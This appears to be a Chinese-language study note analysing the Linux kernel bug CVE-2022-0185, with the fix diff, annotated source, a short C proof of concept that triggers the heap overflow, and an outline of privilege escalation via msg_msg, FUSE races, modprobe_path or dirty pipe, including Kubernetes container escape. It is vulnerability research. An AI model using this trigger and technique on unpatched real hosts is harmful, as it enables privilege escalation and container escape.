## CVE-2022-0185 File System Context Integer Overflow

---

### 影响

Linux-v5.1~v5.16.2。5.1-rc1 引入漏洞，Linux-v5.16.2已修补 ，由syzkaller发现。评分8.4分

需要修改的内核编译选项
```config
CONFIG_CHECKPOINT_RESTORE
CONFIG_USER_NS
CONFIG_FUSE
CONFIG_SYSVIPC
CONFIG_USERFAULTFD

CONFIG_E1000
CONFIG_E1000E
```

### 原理

内核的 File System Context 模块（文件系统环境）的fs/fs_context.c文件中存在整数溢出导致堆溢出。

攻击者须具备 CAP_SYS_ADMIN 权限(允许执行系统管理任务)，或者使用命名空间或者使用unshare(CLONE_NEWNS|CLONE_NEWUSER) （等同于命令$ unshare -Urm: unshare命令是在Linux系统上使用的一个工具，允许创建和管理新的命名空间。）来进入含有CAP_SYS_ADMIN权限的命名空间。

docker中默认没有CAP_SYS_ADMIN权限（启用容器时需使用 `-privileged` 选项），且docker的seccomp过滤会默认拦截 unshare 命令，所以docker中无法利用；但是 Kubernetes 集群在使用docker时，seccomp 过滤默认是禁用的，可以提权和逃逸。

[patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de2)
> The `PAGE_SIZE - 2 - size` calculation in legacy_parse_param() is an
**unsigned type** so a large value of "size" results in a high positive
value instead of a negative value as expected.  Fix this by getting rid
of the subtraction.

```bash
diff --git a/fs/fs_context.c b/fs/fs_context.c
index b7e43a780a625..24ce12f0db32e 100644
--- a/fs/fs_context.c
+++ b/fs/fs_context.c
@@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
 			      param->key);
 	}
 
-	if (len > PAGE_SIZE - 2 - size)
+	if (size + len + 2 > PAGE_SIZE)
 		return invalf(fc, "VFS: Legacy: Cumulative options too large");
 	if (strchr(param->key, ',') ||
 	    (param->type == fs_value_is_string &&
```

#### 源码分析

```c
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
    struct legacy_fs_context *ctx = fc->fs_private;
    unsigned int size = ctx->data_size;    // 由后面的更新可以知道，代表向页面中写入过的数据长度 => `,key=value` 字符串长度
    size_t len = 0;

    if (strcmp(param->key, "source") == 0) {
        if (param->type != fs_value_is_string)
            return invalf(fc, "VFS: Legacy: Non-string source");
        if (fc->source)
            return invalf(fc, "VFS: Legacy: Multiple sources");
        fc->source = param->string;
        param->string = NULL;
        return 0;
    }

    if (ctx->param_type == LEGACY_FS_MONOLITHIC_PARAMS)
        return invalf(fc, "VFS: Legacy: Can't mix monolithic and individual options");

    switch (param->type) {          // 计算 1 + key + value
    case fs_value_is_string:
        len = 1 + param->size;
        fallthrough;                // 这里不是 break 
    case fs_value_is_flag:
        len += strlen(param->key);
        break;
    default:
        return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported",
                  param->key);
    }

    if (len > PAGE_SIZE - 2 - size)                     // size 是已经存在内容的长度，通过构造可以溢出，可以使len很大，从而bypass
        return invalf(fc, "VFS: Legacy: Cumulative options too large");
    if (strchr(param->key, ',') ||
        (param->type == fs_value_is_string &&
         memchr(param->string, ',', param->size)))
        return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                  param->key);
    if (!ctx->legacy_data) {
        ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
        if (!ctx->legacy_data)
            return -ENOMEM;
    }

    ctx->legacy_data[size++] = ',';                     // append，新的内容会追加
    len = strlen(param->key);
    memcpy(ctx->legacy_data + size, param->key, len);   // memcpy key
    size += len;                                        // 更新 size
    if (param->type == fs_value_is_string) {
        ctx->legacy_data[size++] = '=';
        memcpy(ctx->legacy_data + size, param->string, param->size);  // OOB write
        size += param->size;
    }
    ctx->legacy_data[size] = '\0';                     // 截断 0
    ctx->data_size = size;
    ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
    return 0;
}
```

- `PAGE_SIZE-2-size` 结果是一个无符号数，当 size 比较大时会产生溢出（负数转化为无符号数字），导致if判断失误，可以继续执行。使 `memcpy` 时因为 `len` 长度错误，从而导致堆溢出。
- memcpy 不会被 `\x00` 截断，strlen 会截断
- 增加消息形式：`,key=value` 的形式，但是我们传递 key 为 `\x00`，len=0，因此相当于在每次内容前加入了 `,=` 字符串，然后后面为 value 字符串。这也是为什么计算时需要减去2在减去size。

### poc

poc.c: 也需要 `CAP_SYS_ADMIN` 权限才能使用

```c
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void)
{
        char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        int fd = 0;
        fd = fsopen("9p", 0);
        if (fd < 0) {
                puts("Opening");
                exit(-1);
        }
        for (int i = 0; i < 5000; i++) {
                fsconfig(fd, FSCONFIG_SET_STRING, "\x00", val, 0);
        }
        return 0;
}
```

## 漏洞利用

漏洞利用链
__x64_sys_fsconfig() -> vfs_fsconfig_locked() -> vfs_parse_fs_param() -> legacy_parse_param()

调用 fsconfig 需传入 FSCONFIG_SET_STRING 和两个字符串 key / value。填充 key。然后根据 `FSCONFIG_SET_STRING` 调用 vfs_fsconfig_locked 函数，然后调用链形成

`PAGE_SIZE-2-size`  每次传入数据长度为 33 ： (117*(33+2)) == 4095。在第118次就会溢出。
- 最后一次写，会在最后加一个 `\x00`，因此最后一次什么都不写就是溢出 `\x3d\x00` 0x3d是 `=` 的ascii码

```cpp
ctx->legacy_data[size] = '\0';    // 最后赋值
```

### fuse

[fuse](../2-useful-struct/race/fuse.md)

### exploit

整型溢出转化成堆溢出的利用

#### change modprobe_path

1. kmalloc 的size为 `PAGE_SIZE (大部分0x1000)`，flags 为 `GFP_KERNEL`，因此使用 msg_msg 结构体。
2. 泄露内核地址，使用 `seq_ops(0x20)` 因此将 msg 大小设置为 0x1000-0x30+0x20+0x8(page_size-msg_msg_head+seq_ops+msg_msgseg_size) = 0xfe8，同时堆喷射大量的 seq_ops，这样布局可以 msg_seg 后面是 seq_ops
    a. 当然，我们也可以使用其余的结构体来泄露内核基址
3. 触发堆溢出，修改 m_ts 大小，越界读，从而泄露函数地址。
4. 条件竞争造成任意地址写：fuse 稳定竞争
    a. 分配一个消息
    b. 访问消息，触发页错误暂停（msgsnd 中的 copy_from_user 发生缺页中断）。
    c. 分配第二个消息
    d. 覆盖第一个消息next指针，为 modprobe_path。
    e. 将我们的数据拷贝的next指针地方

漏洞利用前的准备： 
(1). pipe 用作同步消息
(2). fuse
(3). modprobe_path


### 另一种利用方式

>来自于 veritas501 师傅的博客

1. 不使用竞争，使用 msg_msg leak 堆地址从而进行uaf的利用，类似于CVE-2021-22555
2. **结合`dirty pipe`，这样我们就不用绕过那些烦人的保护了**
在kernel >= 5.8中，我们只需修改pipe_buffer中splice页的flag |= PIPE_BUF_FLAG_CAN_MERGE即可（有能力可以顺便把offset和len改成0，这样就能从文件的开头开始写）；在kernel < 5.8中，需要先leak一下pipe_buffer中的anon_pipe_ops，然后将splice页的的ops改为anon_pipe_ops（因为<5.8版本中能否merge是看ops的）（有能力依然可以顺便把offset和len改成0）。


## 复现

apt 安装的 libfuse 不能静态编译，因为需要调用dl_open 相关函数，ld 报错
- 编译内核后替换，调试: 不需调用 fuse 的调试全部在qemu下运行，需要 fuse 真机运行+脑内模拟😭
- 使用qemu root权限

主要学习 fuse 在漏洞利用中的使用

### PoC 调试


## 缓解机制

***todo !!!***

## 参考文章

- [willroot cve-2022-0185](https://www.willsroot.io/2022/01/cve-2022-0185.html)
- [bsauce cve-2022-0185](https://bsauce.github.io/2022/04/08/CVE-2022-0185/)
- [xz cve-2022-0185](https://xz.aliyun.com/t/11031)
- [xi4oyu cve-2022-0185](https://www.xi4oyu.top/4161b49f/)
- [chenaotian cve-2022-0185](https://github.com/chenaotian/CVE-2022-0185)
- [veritas501 cve-2022-0185](https://veritas501.github.io/2022_03_16-CVE_2022_0185%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E4%B8%8Epipe%E6%96%B0%E5%8E%9F%E8%AF%AD%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/)
- [pipe-primitive](https://github.com/veritas501/pipe-primitive)
- [fuse 101](https://exploiter.dev/blog/2022/FUSE-exploit.html)
- [Breeze_CAT](https://blog.csdn.net/Breeze_CAT/article/details/123007818)